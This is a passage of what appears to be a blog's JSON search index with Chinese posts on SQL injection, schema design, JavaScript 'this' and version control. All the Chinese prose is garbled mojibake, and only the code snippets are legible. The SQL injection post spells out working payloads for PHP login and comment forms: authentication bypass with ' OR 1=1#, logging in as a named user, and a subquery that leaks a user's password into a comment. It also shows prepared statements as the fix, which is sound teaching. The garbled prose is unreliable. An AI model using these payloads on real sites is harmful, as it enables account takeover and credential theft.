ä¾†ç©å£è³‡æ–™åº«","text":"å¾ˆæœ‰è¶£ï¼ ç°¡è¿°SQL Injection çš„æ”»æ“ŠåŸç†å°±æ˜¯æŠŠåŸæœ¬çš„ SQL æ‰­æ›²æˆåˆ¥çš„æ„æ€ã€‚ è¦æ€éº¼åšåˆ°ï¼Ÿå°±æ˜¯æ·»åŠ ã€Œé¡å¤–çš„ SQLã€ï¼Œè®“åŸæœ¬ SQL çš„æ„æ€æ”¹è®Šï¼ˆå¿µèµ·æœ‰é»é¥’å£ï¼Œä½†å°±æ˜¯é€™å€‹æ„æ€ï¼‰ã€‚ æ¥ä¸‹ä¾†ç”¨ç•™è¨€ç‰ˆä¾†èˆ‰ä¾‹æœƒæ¯”è¼ƒå¥½æ‡‚ä¸€é»ã€‚ ç¯„ä¾‹ä¸€ï¼šç™»å…¥åˆ¥äººçš„å¸³è™Ÿè¦æ”¹è®Š SQL çš„æ„æ€å°±è¦å…ˆçŸ¥é“åŸæœ¬çš„ SQL æ˜¯æ€éº¼å¯«çš„ï¼Œæ‰€ä»¥ä¾†çœ‹ä¸€ä¸‹ç™»å…¥çš„ SQL ç‰‡æ®µï¼š 12345&lt;?php $username = $_POST['username']; $password = $_POST['password']; $sql = \"SELECT * FROM users WHERE username='$username' AND password='$password'\";?&gt; é€™è£¡çš„ SQL æ„æ€æ˜¯ã€Œå¾è³‡æ–™åº«æ’ˆå‡º å¸³è™Ÿ=xxxï¼Œå¯†ç¢¼=xxxã€çš„æ¬„ä½ã€‚ ç¾åœ¨æˆ‘æƒ³æŠŠä»–æ”¹æˆã€Œå¾è³‡æ–™åº«æ’ˆå‡º å¸³è™Ÿ=xxxã€çš„æ¬„ä½ï¼Œæˆ‘å¯ä»¥æ€è€ƒæ€éº¼ç”¨ $username è·Ÿ $password é€™å…©å€‹æ±è¥¿ä¾†é”æˆï¼ˆå› ç‚ºé€™æ˜¯æˆ‘å¯ä»¥è¼¸å…¥å…§å®¹çš„åœ°æ–¹ï¼‰ã€‚ æœ‰æ²’æœ‰è¾¦æ³•è®“ $username å¾Œé¢çš„éƒ¨åˆ†éƒ½è®Šæˆè¨»è§£ï¼Ÿé‚„çœŸçš„æœ‰ï¼Œå°±æ˜¯ #ã€‚çŸ¥é“é€™å€‹å¾Œå°±å¯ä»¥æŠŠ $username å¡«æˆé€™æ¨£ï¼š 1peanu'# é€™æ™‚å€™ SQL å°±æœƒè®Šæˆé€™æ¨£ï¼š 1SELECT * FROM users WHERE username='peanu'#' AND password='aaaaaaaa' ï¼ˆ# å¾Œé¢çš„å…§å®¹éƒ½æœƒç•¶æˆè¨»è§£ï¼Œæ‰€ä»¥ password æƒ³æ‰“å•¥å°±æ‰“å•¥ï¼‰ æ¥è‘—å°±æˆåŠŸç™»å…¥ peanu çš„å¸³è™Ÿäº†ï¼š ç¯„ä¾‹äºŒï¼šç™»å…¥éš¨ä¾¿ä¸€å€‹äººçš„å¸³è™Ÿç¯„ä¾‹ä¸€çš„å»¶ä¼¸ï¼Œå…¶å¯¦ä½ ç”šè‡³å¯ä»¥æŠŠ $username æ”¹æˆé€™æ¨£å­ï¼š 1' OR 1=1# æ„æ€æ˜¯å¾è³‡æ–™åº«æ’ˆå‡º å¸³è™Ÿ=ç©ºå­—ä¸² OR 1=1 çš„æ¬„ä½ï¼Œå› ç‚º 1=1 æ°¸é ä»£è¡¨ trueï¼Œæ‰€ä»¥å°±æœƒæŠŠæ‰€æœ‰çš„ user éƒ½æ’ˆå‡ºä¾†ï¼š å‚™è¨»ï¼šé€™è£¡ cookie å­˜çš„å€¼å°±æ˜¯ ' OR 1=1;ï¼Œæ‰€ä»¥ç•¶é¦–é ç”¨ cookie å»æ’ˆè³‡æ–™æ™‚å°±è·Ÿç™»å…¥çš„é‚è¼¯ä¸€æ¨£ï¼Œç›´æ¥æ’ˆå‡ºæ‰€æœ‰ user çš„è³‡æ–™ï¼Œä¸¦å›å‚³ç¬¬ä¸€æ¬„çš„å…§å®¹ã€‚ ç¯„ä¾‹ä¸‰ï¼šä¸€æ¬¡æ–°å¢å¤šç­†ç•™è¨€é¦–å…ˆè£œå……ä¸€å€‹ SQL çš„çŸ¥è­˜ï¼Œä½ çŸ¥é“ INSERT INTO çš„ VALUE() å…¶å¯¦å¯ä»¥æ”¾å¤šå€‹å€¼å—ï¼Ÿåƒé€™æ¨£ï¼š 1INSERT INTO comments(`nickname`, `content`) VALUES ('Grapes', 'oops'), ('hack', 'æ°´å“¦'); è€Œæˆ‘å€‘åœ¨è™•ç†æ–°å¢ç•™è¨€çš„æ™‚å€™æ˜¯é€™æ¨£æ‹¼æ¥çš„ï¼š 123&lt;?php $sql = \"INSERT INTO comments(`nickname`, `content`) VALUES ('Grapes', '%s')\";?&gt; å…©å€‹æ¯”å°ä¸€ä¸‹ï¼Œå°±æœƒç™¼ç¾ %s çš„å…§å®¹å¯ä»¥é€™æ¨£å¡«ï¼š 1oops'), ('hack', 'æ°´å“¦ é…·æ˜¯è »é…·çš„ï¼Œä½†é€™æ¨£å¯ä»¥åšä»€éº¼å—ï¼Ÿç­‰ä¸€ä¸‹å†å‘Šè¨´ä½ ã€‚ ç¯„ä¾‹å››ï¼šæ’ˆå‡ºæŸäººçš„å¸³è™Ÿå¯†ç¢¼å†è£œå……ä¸€å€‹ SQL çŸ¥è­˜ï¼Œä½ çŸ¥é“ SQL è£¡é¢å¯ä»¥åœ¨åŒ…å¦ä¸€å€‹ SQL å—ï¼Ÿåƒé€™æ¨£ï¼š 12INSERT INTO comments(`nickname`, `content`) VALUES ('peanu', (SELECT password FROM users WHERE id=113)); é€™ç¨® SQL å«åšã€Œsubqueryï¼ˆå­æŸ¥è©¢ï¼‰ã€ã€‚ ç„¶å¾Œé€™é‚Šçš„æ„æ€æ˜¯æ–°å¢ä¸€å€‹æ¬„ä½åˆ° commentsã€‚nickname çš„å…§å®¹æ˜¯ peanuï¼Œcontent çš„å…§å®¹æ˜¯ users ä¸­ id=113 çš„ password æ¬„ä½ã€‚ æ‰€ä»¥ä¸€æ¨£ä¾†ç©æ‹šå­—éŠæˆ²ï¼Œé¦–å…ˆä¾†çœ‹åŸæœ¬çš„ SQL é‚è¼¯ï¼š 123&lt;?php $sql = \"INSERT INTO comments(`nickname`, `content`) VALUES ('Grapes', '%s')\";?&gt; é€™é‚Šè¦æ­é…ç¯„ä¾‹ä¸‰çš„é‚è¼¯ï¼ŒæŠŠè¦æ’ˆè³‡æ–™çš„ SQL ç•¶æˆç¬¬äºŒçµ„ VALUESï¼š 1234æŠ“åˆ°ä½ å›‰'), ( (SELECT username FROM users WHERE id=113), (SELECT password FROM users WHERE id=113))# é€™æ™‚å€™çš„ SQL é•·é€™æ¨£ï¼š 12345INSERT INTO comments(`nickname`, `content`) VALUES ('Grapes', 'æŠ“åˆ°ä½ å›‰'), ( (SELECT username FROM users WHERE id=113), (SELECT password FROM users WHERE id=113))#') æŒæ¡é€™ç¨®æŠ€å·§å¾Œå°±è·Ÿ XSS ä¸€æ¨£ï¼Œåªè¦ä½ å¤ æœ‰ã€Œå‰µæ„ã€ï¼Œè³‡æ–™åº«å°±ä»»ä½ ç©ã€‚ è§£æ±ºè¾¦æ³•é€™é‚Šæœƒç”¨ PHP å…§å»ºçš„ prepared-statement ä¾†æ”¹å¯«ã€‚ å®ƒçš„æ¦‚å¿µå°±è·Ÿé˜² XSS ä¸€æ¨£ï¼ŒæŠŠ SQL çš„åƒæ•¸éƒ¨åˆ†éƒ½ç•¶è½‰æˆã€Œç´”å­—ä¸²ã€ä¾†è™•ç†ã€‚é›–ç„¶ä¸æ˜¯æ¯å€‹ SQL éƒ½æœ‰è¢«æ”»æ“Šçš„é¢¨éšªæ€§ï¼Œä½†ä¿éšªèµ·è¦‹æœ€å¥½æ˜¯æŠŠæ‰€æœ‰ç”¨åˆ° SQL çš„åœ°æ–¹éƒ½åšè·³è„«æœƒæ¯”è¼ƒå¥½ã€‚ é€™é‚Šç°¡å–®ç¤ºç¯„ä¸€ä¸‹ prepared-statement çš„ç”¨æ³•ï¼š 1234567891011// login.php&lt;?php // å…ˆæº–å‚™å¥½ sqlï¼Œåƒæ•¸çš„éƒ¨åˆ†æ”¹ç”¨ ? é€™å€‹ placeholder ä¾†ä»£æ›¿ $sql = \"INSERT INTO comments(`nickname`, `content`) VALUES (?, ?)\"; // æ¥è‘—æŠŠ sql æŒ‡ä»¤ä¸Ÿåˆ° prepare()ï¼Œé€²å…¥æº–å‚™éšæ®µ $stmt = $conn-&gt;prepare($sql); // æ¥è‘—æŠŠå€¼åšç¶å®šï¼ˆç¶å®šéšæ®µï¼‰ï¼Œ'ss' æ˜¯ä»£è¡¨å…©å€‹åƒæ•¸éƒ½æ˜¯ string $stmt-&gt;bind_param('ss', $nickname, $content); // åˆ°é€™é‚Šæ‰æ˜¯çœŸçš„åŸ·è¡Œ sql $result = $stmt-&gt;execute();?&gt; æŠŠæ‰€æœ‰ SQL æŒ‡ä»¤éƒ½æ”¹å¯«å¾Œå°±èƒ½é¿æ‰ SQL Injection å›‰ï¼š","link":"/2022/02/09/what-is-sql-injection/"},{"title":"ä»€éº¼æ˜¯ Schemaï¼ˆçµæ§‹ï¼‰","text":"æ­»æ©Ÿéº»ã€‚ åˆ°åº•ä»€éº¼æ˜¯ Schemaï¼ˆçµæ§‹ï¼‰ï¼Ÿå…¶å¯¦å°±æ˜¯ä¸€å€‹ table çš„å…§å®¹ç°¡è¿°ï¼Œåƒæ˜¯é€™å€‹æ¬„ä½ä»£è¡¨ä»€éº¼å•¦ï¼Œæœ‰æ²’æœ‰é è¨­å€¼ã€å¯ä¸å¯ä»¥æ˜¯ç©ºå€¼ä¹‹é¡çš„ï¼Œé€™å€‹å°±æ˜¯ã€ŒSchemaï¼ˆçµæ§‹ï¼‰ã€ã€‚æˆ‘å€‘å¯ä»¥æ ¹æ“šéœ€æ±‚ä¾†è¨­è¨ˆ Schema ã€‚ åƒè€ƒ myphpadmin ä¸Šçš„çµæ§‹ï¼š å‚™è¨»ï¼šè·Ÿç·¨ç¢¼æœ‰é—œçš„è¨­å®šå»ºè­°ç”¨ utf8mb4_general_ci ä¾†è¨­å®šã€‚ åƒ id æ¬„ä½çš„ schema å°±æ˜¯ï¼š é¡å‹æ˜¯ =&gt; int ç·¨ç¢¼æ’åº =&gt; æ²’è¨­å®š å±¬æ€§ =&gt; æ²’è¨­å®š ç©ºå€¼ =&gt; ä¸å¯ä»¥ç©º é è¨­å€¼ =&gt; ç„¡ é¡å¤–è³‡è¨Š =&gt; Auto Increment æ¯å€‹æ¬„ä½çš„ schema éƒ½ä¸åŒï¼Œä½†ä¸ç®¡æ€éº¼è¨­å®šï¼Œã€Œåç¨±ã€ã€Œå‹æ…‹ã€é€™å…©å€‹æ˜¯ä¸€å®šæœƒæœ‰çš„ã€‚ ä¸€äº›å…¶ä»–çš„ Schema è¨­å®š A_I è‡ªå‹•éå¢ï¼ˆAuto Incrementï¼‰ï¼Œä¿è­‰ä¸æœƒé‡è¤‡ã€‚ CURRENT_TIMESTAMP è®“è³‡æ–™åº«è‡ªå·±åˆ¤æ–·å»ºç«‹æ™‚é–“ã€‚ Primary Keyï¼ˆä¸»éµï¼‰ï¼Œä»£è¡¨ table ä¸­æœ€é‡è¦çš„æ±è¥¿ï¼Œè€Œä¸”ä¸èƒ½é‡è¤‡ï¼Œä¾‹å¦‚ idã€‚ Unique ä»£è¡¨ä¸èƒ½é‡è¤‡ï¼Œé•åçš„è©±æœƒè¢«è³‡æ–™åº«æ“‹ä¸‹ä¾†ã€‚ Index è®“ä½ å¯ä»¥æ¯”è¼ƒå¿«æ‰¾åˆ°è³‡æ–™ã€‚ç•¶è³‡æ–™å¤šçš„æ™‚å€™å°±æœƒæœ‰æ„Ÿäº†ã€‚","link":"/2022/01/30/what-is-schema/"},{"title":"é‡æ–°ç†è§£ this çš„å€¼","text":"äººç¨± JS çš„é ­è™Ÿå…¬æ•µã€‚ this æœ€åŸå§‹çš„ç”¨é€”å›æ­¸åˆ°åŸé»ï¼Œå…¶å¯¦ this æœ¬èº«å°±æ˜¯ç‚ºäº†ç‰©ä»¶å°å‘è€Œå­˜åœ¨çš„æ±è¥¿ï¼Œç”¨ä¾†æŒ‡å‘ä½ å»ºç«‹å‡ºä¾†çš„ instanceã€‚ ä¾‹å¦‚èªªï¼š 1234567891011class Dog { constructor(name) { this.name = name } getName() { return this.name }}const dog1 = new Dog('PeaNu')console.log(dog1.getName()) // PeaNu é¦–å…ˆï¼Œæˆ‘é€é Dog å»ºç«‹äº†ä¸€å€‹ instanceï¼šdog1 è¨˜ä½ï¼Œåªè¦æ˜¯å‡ºç¾åœ¨ dog1 è£¡é¢çš„ this éƒ½ä¸€å¾‹ä»£è¡¨å®ƒè‡ªå·±ï¼Œä¸æœƒæœ‰ä»»ä½•ä¾‹å¤–æƒ…å½¢ç™¼ç”Ÿã€‚åœ¨ç‰©ä»¶å°å‘ä¸‹çš„ this å°±æ˜¯é€™éº¼å–®ç´”ï¼Œæ²’æœ‰ä¸€å¤§å †è«åå…¶å¦™çš„æƒ…æ³ç™¼ç”Ÿã€‚ æ‰€ä»¥æˆ‘ä¸€é–‹å§‹çµ¦ dog1 çš„ name æ˜¯ PeaNuï¼Œé‚£éº¼å®ƒè£¡é¢çš„ this.name å°±åªæœƒæ˜¯ PeaNuã€‚ ä¹‹å¾Œå¦‚æœåˆå»ºç«‹äº†å¦ä¸€å€‹ dog2ï¼ŒæŠŠå®ƒçš„ name è¨­ç‚º PPBï¼Œé‚£å®ƒçš„ this.name ä¹Ÿåªæœƒæ˜¯ PPBï¼Œè·Ÿ dog1 ä¸€é»é—œä¿‚ä¹Ÿæ²’æœ‰ã€‚ ç¸½è€Œè¨€ä¹‹ï¼Œthis çš„åˆè¡·å°±æ˜¯ç”¨ä¾†ä»£è¡¨ã€Œé€™å€‹ instanceã€çš„æ„æ€ï¼Œéå¸¸éå¸¸éå¸¸å–®ç´”ã€‚ åœ¨éç‰©ä»¶å°å‘çš„ç’°å¢ƒä¸‹ï¼Œthis çš„å€¼æ²’æœ‰æ„ç¾©å¦‚æœä½ ç¡¬è¦åœ¨ä¸æ˜¯ç‰©ä»¶å°å‘çš„åœ°æ–¹ç”¨ thisï¼Œå°±æœƒå‡ºç¾ä¸€äº›å¥‡æ€ªçš„çµæœï¼š 1234function test() { console.log(this)}test() // window / global / undefind (strict mode) åœ¨é€™ç¨®æƒ…æ³ä¸‹ï¼Œthis å°±æœƒæ ¹æ“šä¸åŒçš„ç’°å¢ƒè€Œæœ‰ä¸åŒçš„å€¼ã€‚ undefinedï¼Œåœ¨ä½¿ç”¨åš´æ ¼æ¨¡å¼ä¸‹çš„é è¨­å€¼ windowï¼Œåœ¨ç€è¦½å™¨ä¸‹çš„é è¨­å€¼ global åœ¨ Node.js ä¸‹çš„é è¨­å€¼ ä¸ç®¡æœ€å¾Œçš„å€¼æ˜¯ä»€éº¼ï¼Œé€™ç¨® this éƒ½æ²’ä»€éº¼æ„ç¾©ï¼Œæ‰€ä»¥æ‰æœƒæœ‰é€™å€‹æ¨™é¡Œã€‚ æƒ³çŸ¥é“ this å€¼ï¼Œå¾—çœ‹æ˜¯æ€éº¼å‘¼å«çš„ï¼Œä¸æ˜¯å®£å‘Šèˆ‰å€‹ä¾‹å­ï¼š 12345678910'use strict'const obj = { a: 'yoyo', test: function () { console.log(this) }}obj.test() // objconst func = obj.testfunc() // undefined åŒæ¨£éƒ½æ˜¯å‘¼å« testï¼Œä½†ç¬¬ä¸€å€‹çµæœæ˜¯ objï¼Œç¬¬äºŒå€‹çµæœæ˜¯ undefinedï¼Œç‚ºä»€éº¼ï¼Ÿå› ç‚ºå‘¼å«çš„æ–¹å¼ä¸åŒã€‚ ç¬¬ä¸€å€‹ test æ˜¯é€é obj ä¾†å‘¼å«çš„ï¼Œè€Œç¬¬äºŒå€‹æ˜¯ç›´æ¥åŸ·è¡Œ funcï¼Œé€™å…©ç¨®çš„å‘¼å«æ–¹å¼æ˜¯ä¸ä¸€æ¨£çš„ã€‚æ‰€ä»¥å„˜ç®¡ test æ˜¯å®£å‘Šåœ¨ obj é€™å€‹ç‰©ä»¶è£¡ï¼Œä½†åªè¦ç”¨ä¸åŒçš„æ–¹å¼ä¾†å‘¼å«å®ƒï¼Œthis çš„å€¼å°±æœƒä¸åŒã€‚ å†æ¬¡å¼·èª¿ï¼š é‡é»æ˜¯æ€éº¼å‘¼å«ï¼Œè€Œä¸æ˜¯å®£å‘Š é‡é»æ˜¯æ€éº¼å‘¼å«ï¼Œè€Œä¸æ˜¯å®£å‘Š é‡é»æ˜¯æ€éº¼å‘¼å«ï¼Œè€Œä¸æ˜¯å®£å‘Š æ‰€ä»¥å†å‡ºä¸€é¡Œä¾†è€ƒè€ƒä½ ï¼Œä¸‹é¢çš„ this å€¼æœƒæ˜¯ä»€éº¼ï¼Ÿ 1234567891011121314'use strict'const obj = { a: 'obj', test: function () { console.log(this) }}const obj2 = { a: 'obj2', test2: obj.test}obj2.test2() // ??? æƒ³å®Œå¾Œå°±è²¼åˆ° consoleï¼Œçœ‹è·Ÿè‡ªå·±æƒ³çš„ä¸€ä¸ä¸€æ¨£ã€‚ é€é callã€apply å’Œ bind ä¾†æ”¹è®Š this å€¼æ—¢ç„¶ this å€¼æœƒè®Šä¾†è®Šå»çš„ï¼Œé‚£æœ‰æ²’æœ‰è¾¦æ³•æ§åˆ¶å®ƒï¼Ÿ æœ‰ï¼Œå°±ç”¨ callã€apply å’Œ bind ä¾†æ§åˆ¶ï¼Œèˆ‰å€‹ç¯„ä¾‹ï¼š 123456789'use strict'function test() { console.log(this)}test() // undefinedtest.call('this is call') // this is calltest.apply('this is apply') // this is apply call å’Œ apply æ˜¯å¦ä¸€ç¨®åŸ·è¡Œ function çš„æ–¹å¼ï¼Œè·Ÿ () çš„å·®åˆ¥åœ¨æ–¼å®ƒå€‘å¯ä»¥å‚³å…¥ä¸€å€‹åƒæ•¸ï¼Œé€™å€‹åƒæ•¸å°±æ˜¯ç”¨ä¾†æŒ‡å®š this çš„å€¼ï¼Œä½ å‚³ä»€éº¼é€²å»å°±æœƒå‡ºä¾†ä»€éº¼ã€‚ è‡³æ–¼ bind æ¯”è¼ƒç‰¹åˆ¥ä¸€é»ï¼Œä¸€æ¨£å…ˆçœ‹ä¾‹å­ï¼š 123456789'use strict'function test() { console.log(this)}const bindFunc = test.bind('this is bind')bindFunc() // this is bindbindFunc.call('is this call?') // this is bindbindFunc.apply('is this apply?') // this is bind é¦–å…ˆ bind çš„ä½œç”¨ä¸æ˜¯ç”¨ä¾†å‘¼å« functionï¼Œè€Œæ˜¯æŠŠç¶å®š this å¾Œçš„ function çµ¦å›å‚³ï¼Œä»¥ä¸Šé¢çš„ä¾‹å­ä¾†èªªå°±æ˜¯ bindFuncã€‚ é€™æ™‚å€™ä½ å†ç”¨ call æˆ– apply ä¾†å‘¼å«ä¹Ÿæ²’æœ‰ç”¨ï¼Œthis å€¼åªæœƒæ˜¯ä¸€é–‹å§‹ç¶å®šçš„é‚£å€‹å€¼ï¼Œä¸èƒ½è¢«æ”¹è®Šã€‚ ä¸€ç¨®å¿«é€Ÿåˆ¤æ–· this å€¼çš„æŠ€å·§åœ¨çŸ¥é“ call æ€éº¼ä½¿ç”¨ä»¥å¾Œï¼Œä½ å°±å¯ä»¥ç”¨é€™ç¨®è§’åº¦ä¾†æ€è€ƒï¼š 123456789101112131415'use strict'const obj = { a: 'obj', test: function () { console.log(this) }}obj.test() // objobj.test.call(obj) // objconst func = obj.testfunc() // undefinedfunc.call(undefined) // undefined é€éé€™ç¨®æŠŠ function å‰é¢çš„æ±è¥¿ä¸Ÿåˆ° call è£¡é¢ï¼Œæœƒå¹«åŠ©ä½ æ›´å¥½åˆ¤æ–· this å€¼æ˜¯ä»€éº¼ã€‚ä¸éé‚„æ˜¯è¦å¼·èª¿ä¸€ä¸‹ï¼Œé€™åªæ˜¯æ–¹ä¾¿è¨˜æ†¶ï¼Œä¹Ÿè¨±åœ¨ 90% çš„æƒ…å¢ƒä¸‹æ˜¯æ­£ç¢ºçš„ï¼Œä½†ä¸è¦å¿˜äº†é‚„æ˜¯æœ‰ 10% çš„å¯èƒ½æ˜¯éŒ¯çš„ã€‚ ä¾‹å¤–ç‹€æ³äº‹ä»¶ç›£è½å™¨åœ¨äº‹ä»¶ç›£è½ä¸‹çš„ this å€¼æœƒæ˜¯è¢«ç¶å®šçš„å…ƒç´ ï¼š 12345678910111213&lt;ul&gt; &lt;li&gt;&lt;button&gt;click&lt;/button&gt;&lt;/li&gt; &lt;li&gt;&lt;button&gt;click&lt;/button&gt;&lt;/li&gt; &lt;li&gt;&lt;button&gt;click&lt;/button&gt;&lt;/li&gt; &lt;li&gt;&lt;button&gt;click&lt;/button&gt;&lt;/li&gt;&lt;/ul&gt;&lt;script&gt; document.querySelector('ul').addEventListener('click', function (e) { console.log(this) // ul console.log(this === e.targer) // false })&lt;/script&gt; é€™è£¡ç¶å®šçš„æ˜¯ ulï¼Œæ‰€ä»¥æ¯ç•¶è§¸ç™¼ click æ™‚ï¼Œthis å€¼å°±æœƒæ˜¯ ul é€™å€‹å…ƒç´ ã€‚ï¼ˆæ³¨æ„ä¸æ˜¯ e.targetï¼‰ ç®­é ­å‡½å¼æ³¨æ„ï¼šé€™é‚Šçš„ç¯„ä¾‹æ˜¯ä»¥ Node.js ç‚ºä¸»ï¼Œå¦‚æœæ˜¯ç€è¦½å™¨çš„è©±çµæœå¯èƒ½ä¸å¤ªä¸€æ¨£ã€‚ å®£å‘Šçš„é‚£å€‹åœ°æ–¹ this å€¼æ˜¯ä»€éº¼ï¼Œå‡ºä¾†å°±æ˜¯ä»€éº¼ã€‚ ç®­é ­å‡½å¼è·Ÿä¸€èˆ¬å‡½å¼å·®åˆ¥æœ€å¤§çš„åœ°æ–¹å°±æ˜¯é€™è£¡ï¼Œå®ƒåªåœ¨æ„ã€Œå®£å‘Šã€çš„åœ°æ–¹ï¼Œä¸æœƒç®¡ã€Œå‘¼å«æ–¹å¼ã€ã€‚ 12345678910111213141516'use strict'const obj = { a: 'obj', whatIsThis: this, test1: function () { console.log('normal function: ', this) }, test2: () =&gt; { console.log('arrow function:', this) }}console.log(obj.whatIsThis) // {}obj.test1() // obj è‡ªå·±obj.test2() // {} ä¸€å€‹ä¸€å€‹ä¾†çœ‹ï¼Œé¦–å…ˆåœ¨ obj è£¡å®šç¾©äº† whatIsThis ä¾†ç¢ºèªè£¡é¢çš„ this å€¼æ˜¯ä»€éº¼ï¼Œå¾—åˆ°çš„çµæœæ˜¯ {}ã€‚ æ¥è‘—å‘¼å« test1ï¼ŒæŒ‰ç…§å‰é¢æ‰€èªªï¼Œä¸€èˆ¬å‡½å¼çš„ this å€¼æœƒæ ¹æ“šå‘¼å«çš„æ–¹å¼ä¾†æ±ºå®š this å€¼ï¼Œè€Œé€™è£¡æ˜¯é€é obj ä¾†å‘¼å«çš„ï¼Œæ‰€ä»¥ this å€¼å°±æ˜¯ obj æœ¬èº«ï¼Œç¬¦åˆæ¨è«–ã€‚ å†ä¾†æ˜¯ test2ï¼Œä¹Ÿå¦‚åŒå‰é¢æ‰€èªªï¼Œç®­é ­å‡½å¼çš„ this å€¼åªç®¡å®£å‘Šçš„åœ°æ–¹ï¼Œæ‰€ä»¥å®£å‘Šçš„åœ°æ–¹æ˜¯ obj è£¡é¢ï¼Œè€Œ obj è£¡çš„ this å€¼æ˜¯ {}ï¼Œæ‰€ä»¥æœ€å¾Œçš„çµæœç¢ºå¯¦æ˜¯ {}ã€‚ æœ€å¾Œå†å‡ºä¸€é¡Œè€ƒè€ƒä½ ï¼Œç­”å¾—å‡ºä¾†å°±ä»£è¡¨ä½ èƒ½åˆ†è¾¨ç®­é ­å‡½å¼å’Œä¸€èˆ¬å‡½å¼çš„å·®åˆ¥äº†ï¼š 1234567891011121314151617181920212223'use strict'const obj = { a: 'obj', whatIsThis: this, test1: function () { console.log('normal function: ', this) }, test2: () =&gt; { console.log('arrow function:', this) }, test3: function () { console.log('outter normal function:', this) setTimeout(() =&gt; { console.log('inner arrow function', this) }, 1000) }}console.log(obj.whatIsThis) // {}obj.test1() // obj è‡ªå·±obj.test2() // {}obj.test3() // ???","link":"/2022/03/18/what-is-this/"},{"title":"åœ¨å­¸ç‰ˆæœ¬æ§åˆ¶å‰ï¼Œå…ˆç†è§£ä¸‰ä»¶äº‹","text":"åœ¨å­¸ç‰ˆæœ¬æ§åˆ¶ä¹‹å‰ï¼Œæˆ‘è¦ºå¾—å…ˆç†è§£ä»¥ä¸‹å¹¾å€‹å•é¡Œï¼Œæœƒå°å­¸ç¿’æ›´æœ‰å¹«åŠ©ï¼š ä»€éº¼æ˜¯ç‰ˆæœ¬æ§åˆ¶ï¼Ÿ ç‚ºä»€éº¼è¦ç”¨ç‰ˆæœ¬æ§åˆ¶ï¼Ÿ ç‚ºä»€éº¼è¦è®“è»Ÿé«”ä¾†å¹«æˆ‘å€‘åšç‰ˆæ§ï¼Ÿ ä»€éº¼æ˜¯ç‰ˆæœ¬æ§åˆ¶ï¼Ÿä½ ä¸€å®šåšéå ±å‘Šå§ï¼Ÿé‚£ä½ çš„å ±å‘Šæª”æ¡ˆæ˜¯ä¸æ˜¯æœƒåƒé€™æ¨£ï¼šå ±å‘Š 01 -&gt; å ±å‘Š 02 -&gt; å ±å‘Šæœ€çµ‚ç‰ˆ -&gt; å ±å‘ŠçœŸçš„æœ€çµ‚ç‰ˆã€‚ é€™å€‹å…¶å¯¦å°±æ˜¯ã€Œç‰ˆæœ¬æ§åˆ¶ã€ã€‚ä¸€å€‹æª”æ¡ˆä½ å¯èƒ½æœ‰å¾ˆå¤šå€‹ç‰ˆæœ¬ï¼Œä½†ä½ åˆå¸Œæœ›æ¯å€‹ç‰ˆæœ¬éƒ½èƒ½ä¿å­˜ä¸‹ä¾†ï¼Œæ¥è‘—ç‚ºäº†çŸ¥é“æ¯å€‹ç‰ˆæœ¬ä¹‹é–“çš„å·®ç•°ï¼Œä½ é€éã€Œå‘½åã€çš„æ–¹å¼ä¾†è¡¨ç¤ºå®ƒå€‘ä¹‹é–“çš„é—œä¿‚ã€‚ ç‚ºä»€éº¼è¦ç”¨ç‰ˆæœ¬æ§åˆ¶ï¼Ÿå¦‚åŒä¸Šé¢æ‰€èªªï¼Œä¸€å€‹æª”æ¡ˆå¯èƒ½æœ‰å¾ˆå¤šå€‹ç‰ˆæœ¬ï¼Œä½†ä½ å¯èƒ½æœƒæ€•ä¹‹å¾Œä¸å°å¿ƒåšå£äº†ï¼Œæ‰€ä»¥ç‚ºäº†é¿å…é€™ç¨®æå£äº†è¦å…¨éƒ¨é‡åšçš„äº‹æƒ…ç™¼ç”Ÿï¼Œæˆ‘å€‘æœƒå¸Œæœ›æœ‰ä¸€å€‹ã€Œå‚™ç”¨æ–¹æ¡ˆã€çš„æª”æ¡ˆã€‚ æ‰€ä»¥ã€Œä¿å­˜ã€å…¶å¯¦å°±æ˜¯æˆ‘å€‘åšç‰ˆæ§æœ€ä¸»è¦çš„ç›®çš„ã€‚ ç„¶è€Œï¼Œç•¶è¦æ¨¡å°çš„æ™‚å€™ï¼Œä½ å¯ä»¥ç”¨ã€Œå ±å‘Š 01ã€å ±å‘Š 02ï¼Œå ±å‘Š 03ï¼Œâ€¦ã€é€™æ¨£å­çš„æ–¹å¼ä¾†åšç‰ˆæ§ï¼Œä½†æ˜¯ç•¶è¦æ¨¡å¾ˆå¤§çš„æ™‚å€™ï¼Œé€™å°±ä¸æ˜¯ä¸€å€‹å¾ˆå¥½çš„åšæ³•ï¼ˆå¾Œé¢æœƒè§£é‡‹ç‚ºä»€éº¼ï¼‰ã€‚ é€™å€‹æ™‚å€™ä½ å°±æœƒéœ€è¦ã€Œè®“ç¨‹å¼ä¾†å¹«ä½ åšç‰ˆæœ¬æ§åˆ¶ã€ã€‚ ç‚ºä»€éº¼è¦è®“è»Ÿé«”ä¾†å¹«æˆ‘å€‘åšç‰ˆæ§ï¼Ÿæƒ³æƒ³çœ‹é€™å€‹æƒ…å¢ƒï¼šå‡è¨­æœ‰ä¸€ä»½å°ˆæ¡ˆï¼Œç›®å‰æœ‰ä¸€å€‹ã€Œç©©å®šç‰ˆã€çš„ç‰ˆæœ¬ã€‚ç¾åœ¨æˆ‘å€‘æƒ³è¦é–‹ç™¼æ–°åŠŸèƒ½ï¼Œæ‰€ä»¥å°±ç¹¼çºŒå¾ç©©å®šç‰ˆçš„é‚£å€‹ç‰ˆæœ¬ä¾†åšï¼š 12-&gt; ç©©å®šç‰ˆ-&gt; ç©©å®šç‰ˆ + é–‹ç™¼æ–°åŠŸèƒ½ ä½†æ˜¯å¦‚æœç¾åœ¨ PM çªç„¶è·Ÿä½ èªªæœ‰ Bug éœ€è¦ä¿®å¾©ï¼Œä½ è©²æ€éº¼åšï¼Ÿ æ˜¯ä¸æ˜¯åªèƒ½å…ˆæŠŠæ–°åŠŸèƒ½æ‹¿æ‰ï¼ŒæŠŠ Bug ä¿®å¾©å®Œç•¢ï¼Œæ¥è‘—å†é‡æ–°é–‹ç™¼æ–°åŠŸèƒ½ï¼š 12345678-&gt; ç©©å®šç‰ˆ-&gt; ç©©å®šç‰ˆ + é–‹ç™¼æ–°åŠŸèƒ½=== PM èªªå…ˆä¿® Bug ===-&gt; æ‹¿æ‰æ–°åŠŸèƒ½ï¼Œå…ˆä¿®å¾© Bug-&gt; ä¿®å¾© Bug å¾Œçš„ç©©å®šç‰ˆï¼ˆç™¼ä½ˆå‡ºå»ï¼‰-&gt; ä¿®å¾© Bug å¾Œçš„ç©©å®šç‰ˆ + é–‹ç™¼æ–°åŠŸèƒ½ 